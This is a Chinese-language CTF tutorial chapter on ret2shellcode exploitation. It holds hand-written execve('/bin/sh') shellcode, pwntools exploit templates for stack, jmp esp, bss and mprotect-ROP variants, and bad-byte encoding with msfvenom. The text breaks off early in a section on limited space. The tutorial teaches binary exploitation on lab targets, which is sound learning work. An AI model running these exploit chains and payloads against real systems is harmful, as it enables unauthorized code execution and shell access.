# 03 ret2shellcode

> 一句话概括：程序里没有现成的后门函数（ret2text 用不上）时，我们把自己携带的一段机器码——shellcode——作为输入注入到进程的**可执行内存区域**，再劫持控制流跳过去执行，让它替我们发起 `execve("/bin/sh", 0, 0)` 直接拿 shell。

## 本章速览

| 项目 | 说明 |
| --- | --- |
| 核心思想 | 注入机器码（shellcode）到可写且可执行的内存，再把返回地址（或函数指针）改指过去 |
| 适用场景 | 二进制内没有 `system()`/`"/bin/sh"` 等可复用代码（ret2text 失效），但存在可写入且可执行的内存区域 |
| 前置条件 | ① 有溢出点能劫持返回地址；② 目标区域可执行：NX off（栈/bss 可执行），或可调用 mprotect 改权限；③ 输入过程不截断 shellcode（无坏字节冲突） |
| 难度星级 | ★★☆☆☆（栈可执行 + 地址泄漏）～ ★★★★☆（mprotect 三段链 / 坏字节 / 空间受限） |
| 关键工具 | checksec、readelf、gdb（vmmap / proc maps）、pwntools（shellcraft / asm / disasm）、ROPgadget |
| 衔接章节 | 上承 [02 ret2text](02-ret2text.md)；下接 [04 ret2syscall](04-ret2syscall.md)、[11 ORW与沙箱绕过](11-ORW与沙箱绕过.md) |

---

## 3.1 ret2shellcode 定义与本质

### 3.1.1 什么是 shellcode

shellcode 是一段**精心手工构造的机器码**（早期以"spawn 一个 shell"为首要目标而得名），通常几十字节，核心任务是调用系统调用完成攻击者的意图：

- 最常见：`execve("/bin/sh", NULL, NULL)` —— 直接开一个交互式 shell；
- 读文件：`open("/flag") → read → write`（即 orw，常用于沙箱禁止 execve 的场景，详见 11 章）；
- 反弹连接、提权、关防护等更复杂的组合动作。

### 3.1.2 与 ret2text 的对比

| | ret2text | ret2shellcode |
| --- | --- | --- |
| 代码来源 | 程序自带的 .text（后门函数、system 调用点） | 攻击者注入的机器码 |
| 能力上限 | 程序里写了什么就只能做什么 | 任意系统调用，只要 shellcode 写得出来 |
| 关键要求 | 程序中存在 system/后门 | 存在**可写且可执行**的内存 |
| 地址问题 | 后门函数地址固定（no-PIE）或需泄漏 | shellcode 落点地址需已知/定位（本讲核心之一） |
| 坏字节 | 一般只有地址要担心 | shellcode 本体 + 地址都要审计 |

### 3.1.3 本质：两个动作

ret2shellcode 无论怎么变体，都由两个动作组成：

1. **注入**：把 shellcode 当作普通输入写进某块内存（栈 / bss / 堆 / 全局区 / mprotect 后的页）；
2. **跳转**：通过覆盖返回地址（或 GOT、函数指针等）让 EIP/RIP 指向 shellcode 起点。

四种经典落点总览（后文逐一展开）：

```text
情形一：直接跳栈（NX off，栈可执行）
    输入 → [ 栈: shellcode + 填充 + ret=栈地址 ]

情形二：jmp esp / call esp 定位（NX off，但没有栈地址泄漏）
    输入 → [ 栈: 填充 + ret=jmp_esp 的地址 + shellcode ]

情形三：跳 bss（NX off，且程序把输入复制到全局缓冲区）
    输入 → [ 栈: shellcode + 填充 + ret=&buf2 ]，strcpy 把 shellcode 副本送进 bss

情形四：mprotect 改权限（NX on）
    ROP 链: mprotect(page, len, RWX) → read(0, page内地址, n) → 跳过去执行
```

### 3.1.4 判定条件：哪里可执行？

动手前必须先回答两个问题：**NX（DEP）开了没有？哪一段内存可执行？**

第一步，checksec 看 NX：

```text
$ checksec ./pwn
[*] '/home/ctf/pwn'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled        ← 关键！NX 关闭，栈/堆/bss 等全部可执行
    PIE:      No PIE (0x8048000)
```

第二步，readelf 看 GNU_STACK 段属性：

```text
$ readelf -lW ./pwn | grep -A1 'GNU_STACK'
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00 RWE (0x7)
  ← RWE 说明 NX 关闭；若是 RW 则 NX 开启，直接跳栈/跳 bss 都会 SIGSEGV
```

第三步，运行态确认具体哪段可执行（gdb pwndbg/gef 的 vmmap，或直接看 proc）：

```text
pwndbg> vmmap
 LEGEND: E: Executable...
  0x8048000  0x8049000  r-xp  /home/ctf/pwn
  0x8049000  0x804a000  rwxp  /home/ctf/pwn     ← NX off 时可加载段常变 RWX
  ...
  0xfffdd000 0xffffe000 rwxp  [stack]            ← 栈带 E，可放 shellcode

$ cat /proc/<pid>/maps    # 不用 gdb 时直接看真实权限
```

**重要补充：READ_IMPLIES_EXEC**

用 `-z execstack` 链接时，GNU_STACK 被标成 RWE，内核随之给进程设置 `READ_IMPLIES_EXEC` 个性 —— 效果是**所有可读的段都变成可执行**。这就是"NX off 时 bss 也能放 shellcode"（情形三）的底层原因。不同内核/链接器组合下表现略有差异，务必以 `vmmap` / `/proc/pid/maps` 实测为准。

若 NX 开启且没有 mprotect 可用，ret2shellcode 这条路基本封死，应转向 ret2syscall（04 章）或 ret2libc（05 章）。

---

## 3.2 shellcode 手写入门

会用 `shellcraft.sh()` 一键生成当然是基本功，但比赛中坏字节过滤、空间限制、自定义逻辑随时要求你**看得懂、改得动**每一条指令。本节把最经典的 `execve("/bin/sh", 0, 0)` 32 位与 64 位写法逐条拆开。

### 3.2.1 系统调用基础：int 0x80 与 syscall

Linux 下用户态发起系统调用：**32 位走 `int 0x80`，64 位走 `syscall`**，寄存器约定完全不同：

| 项目 | 32 位 | 64 位 |
| --- | --- | --- |
| 触发指令 | `int 0x80`（机器码 cd 80） | `syscall`（机器码 0f 05） |
| 存调用号的寄存器 | eax | rax |
| 参数寄存器顺序 | ebx, ecx, edx, esi, edi, ebp | rdi, rsi, rdx, r10, r8, r9 |
| 返回值 | eax | rax |
| 被内核破坏的寄存器 | 仅 eax（返回值） | rcx、r11（指令自身行为）+ rax |
| execve 调用号 | 11 | 59 |

目标：`execve(path, argv, envp)`，path 指向 `"/bin/sh"` 字符串，argv 与 envp 传 NULL 即可。

### 3.2.2 32 位版逐条讲解

```asm
; execve("/bin//sh", 0, 0) —— 32 位 / int 0x80
xor eax, eax          ; 1. eax = 0：既为后面 mov al 做铺垫，也提供现成的 4 字节 0
push eax              ; 2. 压入 4 字节 0 → 落在字符串末尾充当 '\0' 结束符
push 0x68732f2f       ; 3. 压入 "//sh"（小端序：内存中 2f 2f 73 68）
push 0x6e69622f       ; 4. 压入 "/bin"（2f 62 69 6e）
mov ebx, esp          ; 5. ebx = 栈顶 → 指向栈上的 "/bin//sh"
xor ecx, ecx          ; 6. argv = NULL
xor edx, edx          ; 7. envp = NULL
mov al, 11            ; 8. eax = 11：execve 的 32 位调用号
int 0x80              ; 9. 触发系统调用，getshell
```

逐个技巧拆解：

- **为什么是 "//sh" 而不是 "/sh"**：`"/bin/sh"` 共 7 字节，32 位 push 一次只能压 4 字节；写成 `"/bin//sh"` 正好 8 字节两次压完，双斜杠在路径解析上与单斜杠等价。
- **为什么先 push 0 再 push 字符串**：栈向低地址生长，先压的在高地址。先压 0、后压字符串，0 恰好排在字符串末尾，天然形成结束符。
- **小端序**：`push 0x68732f2f` 写进内存的字节序列是 `2f 2f 73 68`，从低到高读即 `"//sh"`。
- **为什么 `mov al, 11` 而不是 `mov eax, 11`**：后者编码为 `b8 0b 00 00 00`，带三个 `\x00`（坏字节）；前者 `b0 0b` 仅 2 字节。前提是 eax 高 24 位已为 0 —— 第 1 步的 `xor eax, eax` 正是为此。

机器码对照表：

| 汇编 | 机器码 | 字节数 |
| --- | --- | --- |
| xor eax, eax | 31 c0 | 2 |
| push eax | 50 | 1 |
| push 0x68732f2f | 68 2f 2f 73 68 | 5 |
| push 0x6e69622f | 68 2f 62 69 6e | 5 |
| mov ebx, esp | 89 e3 | 2 |
| xor ecx, ecx | 31 c9 | 2 |
| xor edx, edx | 31 d2 | 2 |
| mov al, 11 | b0 0b | 2 |
| int 0x80 | cd 80 | 2 |

合计 23 字节，不含 `\x00`，可直接用于 strcpy 场景。

### 3.2.3 64 位版逐条讲解

**版本 A：允许 `\x00` 的简单版**（适用于 read / gets 等不以 `\x00` 截断的输入通道）

```asm
; execve("/bin/sh", 0, 0) —— 64 位 / syscall
xor esi, esi                 ; 1. argv = NULL（31 f6 同时清掉 rsi 高 32 位）
xor edx, edx                 ; 2. envp = NULL
push rdx                     ; 3. 压入 8 字节 0 → 字符串结束符
mov rax, 0x68732f6e69622f    ; 4. "/bin/sh\0" 小端装入 rax（注意 imm64 末字节是 \x00！）
push rax                     ; 5. 字符串入栈
mov rdi, rsp                 ; 6. rdi → 栈上 "/bin/sh"
push 0x3b                    ; 7. 压调用号 59（6a 3b，2 字节无坏字节）
pop rax                      ; 8. rax = 59；比 mov eax 免 \x00，比 xor+mov 省一条
syscall                      ; 9. 触发系统调用
```

机器码对照表：

| 汇编 | 机器码 |
| --- | --- |
| xor esi, esi | 31 f6 |
| xor edx, edx | 31 d2 |
| push rdx | 52 |
| mov rax, 0x68732f6e69622f | 48 b8 2f 62 69 6e 2f 73 68 00 |
| push rax | 50 |
| mov rdi, rsp | 48 89 e7 |
| push 0x3b | 6a 3b |
| pop rax | 58 |
| syscall | 0f 05 |

共 24 字节，但 `mov rax, imm64` 的编码末尾带一个 `\x00` —— **不能**用于 strcpy/strcat 这类按 `\x00` 截断的复制场景。

**版本 B：无 `\x00` 版（"/bin///sh" 技巧）**

```asm
push 0x68                    ; 6a 68：压入 'h'，push imm8 自动把高 7 字节补 0
                             ;       → 一次性同时拿到 'h' 和结束符，且编码无 \x00
mov rax, 0x732f2f2f6e69622f  ; 48 b8 2f 62 69 6e 2f 2f 2f 73：即 "/bin///s"，无 \x00
push rax                     ; 紧挨着 'h' 压入 → 栈上连成 "/bin///sh\0"
mov rdi, rsp                 ; rdi → 字符串
xor esi, esi                 ; argv = NULL
xor edx, edx                 ; envp = NULL
push 0x3b                    ; 调用号 59
pop rax
syscall
```

25 字节，全程无 `\x00`，strcpy 场景也能用。`"/bin///sh"` 多出的两个斜杠同样无害，只为凑满 8 字节与 64 位 push 对齐。

### 3.2.4 pwntools 三件套：shellcraft / asm / disasm

```python
from pwn import *
context.arch = 'amd64'          # 或 'i386'。务必先设架构，否则生成/汇编体系不对

src = shellcraft.amd64.linux.sh()   # 1) shellcraft：返回 shellcode 的汇编源码字符串
print(src)                          #    打出来逐行读，是学习 shellcode 的最佳素材

sc = asm(src)                       # 2) asm：汇编源码 → 机器码 bytes
print(sc.hex())                     #    例：6a6848b82f62696e2f2f2f7350...

print(disasm(sc))                   # 3) disasm：机器码 → 反汇编文本，写完务必核对
print(disasm(b'\x48\x89\xe7'))      #    → "mov rdi, rsp"
```

shellcraft 常用变体：

```python
shellcraft.sh()                          # 按 context.arch 自动选 32/64 位
shellcraft.i386.linux.sh()               # 32 位显式指定
shellcraft.amd64.linux.sh()              # 64 位显式指定
shellcraft.execve('/bin/sh', 0, 0)       # 直接生成 execve
shellcraft.cat('/flag')                  # 读文件的 orw 雏形（详见 11 章）
```

命令行快速体验：

```bash
pwn shellcraft amd64.linux.sh          # 查看 shellcraft 生成的汇编源码
pwn shellcraft amd64.linux.sh -f hex   # 直接输出机器码 hex
pwn asm -c i386 -f hex 'xor eax, eax'  # 单条指令 → 31c0
echo 4889e7 | pwn disasm -c amd64      # 机器码 → 反汇编
```

想快速验证一段 shellcode 能不能跑，可以让 pwntools 把它打包成 ELF 直接执行：

```bash
pwn shellcraft i386.linux.sh -f elf -o sh32 && chmod +x sh32 && ./sh32
```
---

## 3.3 情形一：栈可执行（NX off），直接跳栈上 shellcode

### 3.3.1 原理

NX 关闭时栈本身就是可执行的：shellcode 随输入落在栈上，把返回地址覆盖成**栈上 shellcode 的起始地址**即可。

```text
        栈（可执行，NX off）
低地址  +------------------------+ ← buf（输入起点 = shellcode 落点）
        | shellcode (23~25 字节) |  ← 注入的机器码
        | 'a' * padding          |  ← 普通填充，补到返回地址处
        +------------------------+ ← buf + offset
        | p32/p64(&buf)          |  ← 覆盖 ret：指回 buf，即 shellcode 起点
        +------------------------+
高地址  | ...                    |

执行流：main 返回 → eip/rip = &buf → 从头执行 shellcode → execve → getshell
```

### 3.3.2 利用条件

- checksec 显示 NX disabled（或 vmmap 中栈带 E）；
- 能拿到栈上 shellcode 的地址：程序打印 / gdb 定位 / nop sled 猜测；
- 输入函数能完整写入 shellcode 与地址（坏字节审计，见 3.7）。

### 3.3.3 shellcode 地址从哪来

**方法一：程序自己打印（最常见）**

```c
printf("buf = %p\n", buf);   // 或打印其他栈变量的地址再换算
```

exp 里 recv 解析即可，最稳。

**方法二：gdb 算固定偏移（本地 ASLR 关闭时栈地址稳定）**

```bash
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space   # 关闭内核 ASLR
$ gdb ./pwn
pwndbg> b main
pwndbg> r
pwndbg> vmmap          # 记下 [stack] 区间
pwndbg> x/20wx $esp    # 发送 payload 后看 shellcode 落在哪个地址
```

注意：gdb 自带的环境变量会改变栈布局，gdb 里看到的地址与真机运行可能不同。可用 `process(['./pwn'], aslr=False)` 或固定 `env={...}` 让 exp 与 gdb 环境一致，再实测校准。

**方法三：nop sled 猜测（无泄漏时的兜底）**

```text
[ \x90 * 0x200 ][ shellcode ][ padding ][ ret = 猜测地址 ]
  ↑ sled 区               ↑ 真正的代码
```

`\x90` 是单字节 NOP。只要猜测地址落在 sled 区的**任意位置**，CPU 都会一路"滑"到 shellcode。nop sled 把容错半径从 1 字节扩大到 sled 的长度；栈随机化位数少的 32 位系统上命中率可观，64 位地址空间基本要靠泄漏。

### 3.3.4 exp 模板

32 位（程序打印 buf 地址）：

```python
from pwn import *
context(arch='i386', log_level='info')

p = process('./pwn32')                      # 远程：remote('ip', port)
elf = ELF('./pwn32')

p.recvuntil(b'buf = ')
buf_addr = int(p.recvline().strip(), 16)    # 解析程序打印的栈地址

offset = 0x6c                               # cyclic/pattern 实测（见 01/02 章）
shellcode = asm(shellcraft.i386.linux.sh())

payload  = shellcode                        # shellcode 放在 buf 开头
payload  = payload.ljust(offset, b'a')      # 填充到返回地址处
payload += p32(buf_addr)                    # ret → buf，即 shellcode 起点

p.sendline(payload)                         # 输入函数是 read 时改用 send
p.interactive()                             # 成功则出现 $，ls; cat flag
```

64 位：

```python
from pwn import *
context(arch='amd64', log_level='info')

p = process('./pwn64')
p.recvuntil(b'buf = ')
buf_addr = int(p.recvline().strip(), 16)

offset = 0x50 + 8                           # buf 大小 + saved rbp（64 位 8 字节）
shellcode = asm(shellcraft.amd64.linux.sh())

payload = shellcode.ljust(offset, b'a') + p64(buf_addr)
p.send(payload)
p.interactive()
```

**变体**：shellcode 也可以放在返回地址之后（`'a'*offset + p64(目标) + shellcode`），只要目标地址算得准，与放 buf 开头等价；有时输入函数对开头几个字节敏感（如要求特定头部），放后面更灵活。

**常见坑**：偏移没算对，ret 指进填充区 → SIGSEGV 或非法指令；`sendline` 多送的 `\n` 恰好被程序当第二次输入消费掉；程序返回前把缓冲区清零/复用，shellcode 被破坏（少见但要想到）。

---

## 3.4 情形二：跳到 jmp esp / call esp gadget 定位栈上 shellcode

**适用**：NX off，但**没有任何栈地址泄漏**（典型：远程开着 ASLR，程序也不打印地址）。

### 3.4.1 原理

关键事实：`ret` 指令执行后，esp/rsp **恰好指向原返回地址的下一格**。如果返回地址填的是一条 `jmp esp` 的地址，而紧挨着它的下一格放 shellcode，就实现了与具体栈地址无关的定位：

```text
        栈
低地址  +------------------------+
        | 'a' * offset           |
        +------------------------+ ← 原返回地址位置
        | &jmp_esp（如 0x80xxxx）| ← ret：eip ← jmp_esp，同时 esp += 4（64 位 +8）
        +------------------------+ ← esp 现在正好指这里
        | shellcode              | ← jmp esp 执行后 eip = esp = 这里
高地址  +------------------------+
```

- 32 位：`jmp esp` = `ff e4`；`call esp` = `ff d4`（call 会先 push 一个返回地址再跳，同样落在 shellcode 上）。
- 64 位：`jmp rsp` = `ff e4`；`call rsp` = `ff d4`。

### 3.4.2 找 gadget

```bash
ROPgadget --binary ./pwn --only "jmp esp"     # 32 位找 jmp esp
ROPgadget --binary ./pwn --only "jmp rsp"     # 64 位找 jmp rsp
objdump -d ./pwn | grep -nE 'ff e4|ff d4'     # 直接搜机器码
```

用 pwntools 搜字节序列：

```python
from pwn import *
context.arch = 'i386'
elf = ELF('./pwn')
jmp_esp = asm('jmp esp')                       # b'\xff\xe4'
for addr in elf.search(jmp_esp, executable=True):
    print(hex(addr))                           # 任意可执行段里的命中都能用
```

注：NX off 时几乎所有段可执行，.text、.data 里搜到的都行；但若程序开了 PIE，gadget 地址本身也随机化，此法多用于 no-PIE 场景。

### 3.4.3 exp 模板

32 位：

```python
from pwn import *
context(arch='i386', log_level='info')

p = process('./pwn32')
elf = ELF('./pwn32')

jmp_esp = next(elf.search(asm('jmp esp'), executable=True))  # 或手填 ROPgadget 结果
offset = 0x74                                                # cyclic 实测

payload  = b'a' * offset
payload += p32(jmp_esp)                        # 覆盖 ret → jmp esp
payload += asm(shellcraft.i386.linux.sh())     # 紧随其后：jmp esp 正好落在这里
p.sendline(payload)
p.interactive()
```

64 位同理，gadget 换 `jmp rsp`，偏移按 8 字节对齐实测：

```python
jmp_rsp = next(elf.search(asm('jmp rsp'), executable=True))
payload = b'a' * 0x58 + p64(jmp_rsp) + asm(shellcraft.amd64.linux.sh())
```

**常见坑**：有些函数在 `ret` 前有 `leave`、`add esp, n` 或 `pop` 一串寄存器，导致 ret 时 esp 不再指向返回地址下一格 → `jmp esp` 跳偏。对策：换 `call esp`、`sub esp, xx; jmp esp` 类 gadget，或在 shellcode 前垫 nop 微调；最稳妥还是反汇编确认目标函数的 epilogue。

---

## 3.5 情形三：bss 段写入 + 执行

**适用**：NX off，且程序会把你的输入**复制到全局缓冲区**（bss/数据段）。no-PIE 下 bss 地址固定，NX off（READ_IMPLIES_EXEC）下 bss 可执行 —— 栈上放 shellcode，返回地址跳 bss。

### 3.5.1 典型源码特征

```c
char buf2[200];                  // 全局未初始化变量 → 位于 bss

int main() {
    char s[100];
    read(0, s, 0x100);           // 或 gets(s) / fgets / scanf，能溢出即可
    strcpy(buf2, s);             // 关键：把输入复制进 bss！
    puts(buf2);
    return 0;
}
```

### 3.5.2 原理与完整栈图

```text
栈（溢出与劫持）                              bss（存放与执行）
低地址 +--------------------+                低地址 +--------------------+
       | shellcode          |                       | ...                |
       | 'a' * padding      |      strcpy           +--------------------+ ← &buf2（固定，如 0x804C060）
       +--------------------+  ───复制──→            | shellcode 副本     | ← NX off ⇒ 可执行
       | saved ebp（假 ebp） |                       |                    |
       +--------------------+                       +--------------------+
       | ret = &buf2        | ← 劫持目标       高地址 | ...                |
       +--------------------+                高地址
```

要点：

- shellcode 必须无 `\x00`（strcpy 截断）—— 这正是 3.2.3 版本 B 的用武之地；同理 payload 里也不能有 `\x00`。
- `&buf2` 由 ELF 决定：`elf.symbols['buf2']`，no-PIE 下固定；程序若打印地址则直接用。
- s 到返回地址的偏移用 `cyclic` 实测。
- 64 位下 `p64(bss_addr)` 本身常含 `\x00`（如 `0x404060` → `60 40 40 00 00 00 00 00`）：gets/read/scanf("%s") 都**不会**因 `\x00` 截断（只怕 `\n`/空白），所以地址照常发送即可；坏的是 strcpy 复制 shellcode 时遇到的 `\x00`，两件事要分清。

### 3.5.3 exp 模板

32 位：

```python
from pwn import *
context(arch='i386', log_level='info')

p = process('./r2s')
elf = ELF('./r2s')
# p = remote('node.example.com', 10003)

bss_addr = elf.symbols['buf2']        # 如 0x0804C060，no-PIE 固定
offset   = 112                        # s → 返回地址的距离，cyclic 实测

shellcode = asm(shellcraft.i386.linux.sh())          # 不含坏字节
payload = shellcode.ljust(offset, b'a') + p32(bss_addr)

p.sendline(payload)                   # gets/strcpy 场景 payload 内不能有 \x00/\x0a
p.interactive()
```

64 位（strcpy 场景必须用无 `\x00` 的 shellcode）：

```python
from pwn import *
context(arch='amd64', log_level='info')

p = process('./r2s64')
elf = ELF('./r2s64')

shellcode = asm('''
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    push 0x3b
    pop rax
    syscall
''')                                            # 25 字节，无 \x00
bss_addr = elf.symbols['buf2']
offset   = 136                                  # 64 位常见 0x88，cyclic 实测

payload = shellcode.ljust(offset, b'a') + p64(bss_addr)
p.sendline(payload)
p.interactive()
```

**变体**：

- 复制用的是带长度的 `memcpy(buf2, s, n)`：`\x00` 可以存活，优先用更短的 shellcode；
- 程序同时打印 `buf2` 地址：直接用打印值，省去查符号；
- buf2 不是 bss 而是堆里 `malloc` 的（NX off 时堆同样可执行）：思路完全一致，只是地址来源变成泄漏。
---

## 3.6 情形四：NX 开启，但可调用 mprotect

### 3.6.1 原理

NX on 意味着栈/bss 都不可执行，但权限是**可以改的**。`mprotect` 系统调用能修改一段内存的读写执行属性：

```c
int mprotect(void *addr, size_t len, int prot);
// prot 取值：PROT_READ=1  PROT_WRITE=2  PROT_EXEC=4，按位或 → RWX = 7
```

若程序导入了 mprotect（动态链接有 `mprotect@plt`，或静态链接内有该函数），就构造 ROP 链：先调 `mprotect` 把某页改成 RWX，再调 `read` 把 shellcode 读进该页，最后"返回"到 shellcode —— 即 **mprotect + read + shellcode 三段链**：

```text
栈上 ROP 链（64 位示意）:
+----------------+ ← 低地址
| 'a' * offset   |
+----------------+
| pop rdi ; ret  |─→ page          ┐
| pop rsi ; ret  |─→ 0x1000        ├ ① mprotect(page, 0x1000, 7)
| pop rdx ; ret  |─→ 7             ┘   该页获得 RWX
| mprotect@plt   |
+----------------+
| pop rdi ; ret  |─→ 0             ┐
| pop rsi ; ret  |─→ page + 0x100  ├ ② read(0, page+0x100, 0x200)
| pop rdx ; ret  |─→ 0x200         ┘   第二次输入的 shellcode 读进该页
| read@plt       |
+----------------+
| page + 0x100   | ← ③ read 的返回地址 = shellcode 所在 → 执行
+----------------+ ← 高地址
```

小技巧：32 位链里 mprotect 的"返回地址"直接填 `read@plt` 的入口，这样 mprotect 一返回就进入 read，栈顶紧接着就是 read 的参数，链子无缝衔接（见 3.6.3）。

### 3.6.2 调用布局与页对齐

| | 32 位（int 0x80 直接调） | 64 位（syscall 直接调） | ROP 走 plt/符号 |
| --- | --- | --- | --- |
| 调用号 | 125 | 10 | 无需 |
| 参数寄存器 | ebx=addr, ecx=len, edx=prot | rdi=addr, rsi=len, rdx=prot | 32 位 gadget: pop ebx/esi/edx；64 位: pop rdi/rsi/rdx |

- **addr 必须页对齐**：`addr & ~0xfff`（即向下取整到 0x1000 边界，32 位也可写 `addr & 0xfffff000`），否则内核返回 -EINVAL。
- len 按页向上取整，直接给 0x1000 最省心。
- 改谁：常用 bss 所在页、栈所在页（需栈地址）、heap 页；只要拿到目标地址，先 `& ~0xfff` 求页起点。
- 若没有 mprotect@plt/符号，但有 `syscall` gadget，可按上面的调用号纯 ROP 拼系统调用（衔接 04 章）：

```python
payload += p64(pop_rax) + p64(10)        # __NR_mprotect = 10
payload += p64(pop_rdi) + p64(page)
payload += p64(pop_rsi) + p64(0x1000)
payload += p64(pop_rdx) + p64(7)
payload += p64(syscall_gadget)
```

### 3.6.3 完整 32 位三段链模板

```python
from pwn import *
context(arch='i386', log_level='info')

p = process('./pwn32')
elf = ELF('./pwn32')

mprotect_plt = elf.plt['mprotect']      # 静态链接改用 elf.symbols['mprotect']
read_plt     = elf.plt['read']
pop3ret      = 0x0804921c               # ← ROPgadget --binary pwn32 --only "pop|ret"
                                        #   找 "pop ebx ; pop esi ; pop ebp ; ret"
page         = 0x0804b000               # ← 目标页 = (bss 地址) & ~0xfff
offset       = 112                      # cyclic 实测

payload  = b'a' * offset
# ① mprotect(page, 0x1000, RWX)
payload += p32(pop3ret)
payload += p32(page) + p32(0x1000) + p32(7)
payload += p32(mprotect_plt)
# ② read(0, page+0x100, 0x200)：mprotect 的返回地址直接填 read@plt，
#    返回即进入 read；接下来依次是 read 的返回地址与三个参数
payload += p32(read_plt)
payload += p32(page + 0x100)                          # read 执行完 → 跳到 shellcode
payload += p32(0) + p32(page + 0x100) + p32(0x200)    # fd=0, buf, count

p.sendline(payload)
sleep(0.5)                              # 等程序执行到第二次 read
# ③ 发送第二段：shellcode 被读进 page+0x100 并被执行
p.send(asm(shellcraft.i386.linux.sh()))
p.interactive()
```

### 3.6.4 完整 64 位三段链模板

```python
from pwn import *
context(arch='amd64', log_level='info')

p = process('./pwn64')
elf = ELF('./pwn64')

# gadget 用 ROPgadget --binary pwn64 | grep -E ": pop (rdi|rsi|rdx)" 查询后填入
pop_rdi = 0x4012b3                      # pop rdi ; ret
pop_rsi = 0x4012b1                      # pop rsi ; ret（若是 pop rsi; pop r15; ret 则多垫 8 字节）
pop_rdx = 0x4012af                      # pop rdx ; ret（找不到见下方"坑"）

page   = elf.bss() & ~0xfff             # bss 所在页起点（页对齐）
offset = 0x50 + 8

payload  = b'a' * offset
# ① mprotect(page, 0x1000, RWX)
payload += p64(pop_rdi) + p64(page)
payload += p64(pop_rsi) + p64(0x1000)
payload += p64(pop_rdx) + p64(7)
payload += p64(elf.plt['mprotect'])
# ② read(0, page+0x100, 0x200)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(page + 0x100)
payload += p64(pop_rdx) + p64(0x200)
payload += p64(elf.plt['read'])
# ③ read 的返回地址 → 刚读入的 shellcode
payload += p64(page + 0x100)

p.send(payload)
sleep(0.5)
p.send(asm(shellcraft.amd64.linux.sh()))
p.interactive()
```

**常见坑**：

- 64 位经常找不到裸的 `pop rdx ; ret` → 找 `pop rdx ; pop rbx ; ret` 之类多垫一个数，或用 ret2csu（__libc_csu_init 中的 gadget，见 07 章）；
- mprotect 只对**已映射**的内存有效，对未映射地址操作返回 -ENOMEM；
- 第二次输入必须在程序执行到 read 之后发送，`sleep(0.5)` 或等程序回显最稳；
- 第二次输入走 gets/fgets 时注意 shellcode 别带 `\x0a`。

---

## 3.7 坏字节处理专题

### 3.7.1 常见坏字节及成因

| 坏字节 | 名称 | 截断/失败原因 |
| --- | --- | --- |
| `\x00` | NUL | strcpy/strcat/strlen/strcmp 等字符串族函数遇到 0 即停止；也常见于 64 位地址高位 |
| `\x0a` | LF（\n） | gets/fgets/scanf("%s") 遇换行停止；许多逐行读取逻辑同样 |
| `\x0d` | CR（\r） | 网络传输中 \r\n 规范化、server 端清洗、部分协议解析 |
| `\x20` | 空格 | scanf("%s") 以空白分隔；部分自定义/协议解析切分 |
| `\xff` | | 程序自定义黑名单过滤；strtol/atoi 把含 \xff 的串解析出意外值（-1 附近）；某些 server 对高位字节敏感 |

判定方法：优先读源码/反汇编，看输入与复制用了哪些函数；二进制黑盒时可对 payload 逐字节 fuzz（对 0~255 每个字节构造 `填充+该字节+填充`，观察哪一次控制流断掉），结合现象归纳坏字节集合。

一个重要区分：**坏字节检查的是 payload 的字节序列**（经过输入通道的部分），不是运行时内存里的零。比如 `push 0x68` 编码为 `6a 68`，不含 `\x00`，它在运行时向栈上写出的高 7 字节 0 是执行阶段产生的，不经过输入通道，不算坏字节。

### 3.7.2 应对一：手工改写指令避开坏字节

| 含坏字节的写法 | 机器码 | 无害写法 | 机器码 |
| --- | --- | --- | --- |
| mov eax, 0 | b8 00 00 00 00 | xor eax, eax | 31 c0 |
| mov eax, 11 | b8 0b 00 00 00 | mov al, 11（eax 已清零时） | b0 0b |
| mov edx, 0 | ba 00 00 00 00 | xor edx, edx；或 cdq | 31 d2 / 99 |
| mov rax, imm64（尾部常带 00） | 48 b8 ... 00 | push imm8 + pop rax | 6a 3b 58 |
| push 0x0b001234（imm 含坏字节） | 68 ... | 拆两半 push，或 xor/add 拼出 | — |
| 需要常量 0x0a | b0 0a？含坏字节 | push 9 ; pop rax ; inc al | 6a 09 58 fe c0 |

原则：用 `xor`、`push/pop`、短寄存器（al/bl/dl）、加减组合等短编码替代带大立即数的 `mov`；字符串结尾用"先压 0 / 压 0x68"类技巧免费获得。

### 3.7.3 应对二：pwntools alpha 编码 / msfvenom encoder

pwntools 自带 alpha 编码器（输出纯字母数字）：

```python
from pwn import *
context.arch = 'i386'
sc  = asm(shellcraft.i386.linux.sh())
bad = b'\x00\x0a\x20'
sc_alpha = pwnlib.encoders.i386.alpha_encoder.encode(sc, avoid=bad)
print(sc_alpha)      # 解码器 + 编码体，全部落在 [0-9a-zA-Z]
```

原理一句话：整段 shellcode 被编码成纯字母数字字符，头部附一段同样纯字母数字的解码器，运行时由解码器还原原始机器码再跳入。专治"输入只允许字母数字"的极端过滤；代价是长度膨胀到百字节级，注意目标空间。

msfvenom 同样能按坏字节自动选择编码器：

```bash
msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x00\x0a\x20' -f py   # -b 指定避开的字节
msfvenom -p linux/x64/exec CMD=/bin/sh -b '\x00\x0a' -f py
msfvenom -p linux/x86/exec CMD=/bin/sh \
         -e x86/alpha_mixed BufferRegister=ESP -f py             # 纯字母数字编码
```

alpha_mixed 配合 `BufferRegister=ESP` 表示"payload 起点就在栈顶"（常见于 jmp esp 场景），解码器第一个字节起就是纯字母数字。

### 3.7.4 应对三：字符串拼接式构造

- **拆段输入**：read 不截断 `\x00`，strcpy 截断。若程序既有溢出点又有多处写入机会（先读栈、再复制 bss），把含 `\x00` 的内容安排给 read 通道，复制环节安排无 `\x00` 的内容。
- **分批拼接**：输入函数是循环 read/多次 gets 时，第一次 send 前半段、第二次 send 后半段，每段内部避开坏字节。
- **运行时拼常量**：shellcode 里真正需要的常量（如 0x0a）用无害运算在寄存器里拼出来，而不是写死在 payload 里（见 3.7.2 最后一行）。

---

## 3.8 空间不足专题

症状：`read(0, buf, 0x20)` 只给 32 字节，塞不下"shellcode + 填充 + 地址"；或从 buf 到返回地址只有几十字节。四种对策：

**方案 A：两段式 —— 第一段只放"读第二段"的短 stub**

```text
第一次输入（短）:                     第二次输入（长）:
[ read(0, 目标区, n) 的短代码或 ROP ]  [ 完整 shellcode → 被读进目标区 ]
[ ret → 执行 stub / 直接跳目标区 ]
```

